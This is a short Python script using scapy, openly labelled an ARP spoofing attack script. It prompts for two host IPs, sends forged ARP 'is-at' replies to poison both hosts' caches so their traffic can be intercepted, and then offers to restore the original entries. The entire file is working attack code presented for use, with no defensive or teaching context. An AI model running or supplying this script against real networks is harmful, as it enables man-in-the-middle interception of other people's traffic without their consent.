print("""

           ###### Arp Spoofing Attack Script ######

""")





from scapy.all import *


def getmac(ip):
    packet = Ether(dst = "ff:ff:ff:ff:ff:ff")/ ARP(pdst = ip)
    result = srp(packet , verbose = 0)
    return result[0][0][1].hwsrc

def spoof(target_ip , spoof_ip):
    target_mac = getmac(target_ip) # ARP -> IP 2 MAC

    packet = Ether(dst = target_mac) / ARP(psrc=spoof_ip , pdst=target_ip,hwdst = target_mac , op = "is-at")
    try:
        sendp(packet , verbose = 0)
        return True
    except :
        return False

def restore(target_ip , spoof_ip):
    target_mac = getmac(target_ip)
    spoof_mac = getmac(spoof_ip)

    packet = Ether(dst = target_mac) / ARP(psrc = spoof_ip ,pdst = target_ip ,hwsrc = spoof_mac ,hwdst = target_mac ,op = "is-at")

    try:
        sendp(packet , verbose = 0)
        return True
    except:
        return False


# # # # # #  # # # # # # #  # # # # # #
target_ip = input("First HOST IP ==> : ")
spoof_ip = input("Second HOST IP ==> : ")

if spoof(target_ip , spoof_ip) and spoof(spoof_ip , target_ip):
    print("Done . ")
else:
    print("error")


req = input("Restore [y/n] ? ").lower()
if req == "y":
    restore(target_ip , spoof_ip)
    restore(spoof_ip , target_ip)